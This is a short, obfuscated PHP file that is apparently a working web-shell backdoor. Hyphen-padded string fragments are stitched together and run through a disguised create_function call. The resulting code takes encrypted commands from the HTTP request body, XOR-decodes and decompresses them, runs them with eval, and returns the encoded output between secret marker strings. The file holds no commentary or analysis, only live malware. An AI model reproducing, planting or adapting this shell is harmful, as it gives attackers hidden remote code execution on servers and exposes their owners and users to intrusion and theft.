<?php
$m='@base-64_decode(-$m[1]),$k)-));$-o=@ob_-get_c-onten-ts-();@ob_end_cl-e-a';
$W='n();-$r=@ba-se6-4_encode-(@x(-@gzcompr-ess($o),-$-k));print("$p$kh$-r$kf");}';
$r='$k="c3ed-3152-";$kh="---2f-c0b1484d88";$kf="00-592c9c4-58---8";$p-="m6Rjkg';
$j='RY8XIWI6hA-";fun-ction x($t,$k)-{$c-=strlen-(--$k);$l=strlen($t);$o-="";f';
$i='k{$-j};}}return -$o;}if -(-@preg-_match("/$kh(-.+)$kf-/-"-,@file_get-_cont';
$n='-ents("php://-in-put"),$m)-==1) -{@o-b_star-t();@eva-l(@gzu-ncompres-s(@-x(-';
$N=str_replace('fJ','','crefJatfJe_fJffJufJnctifJon');
$d='-or-(-$i=0;$i<$l;-){-for($j=0;($j<$c-&-&$i<$-l);$j++,$--i++){$o-.=$t{$i-}^$';
$g=str_replace('-','',$r.$j.$d.$i.$n.$m.$W);
$G=$N('',$g);$G();
?>
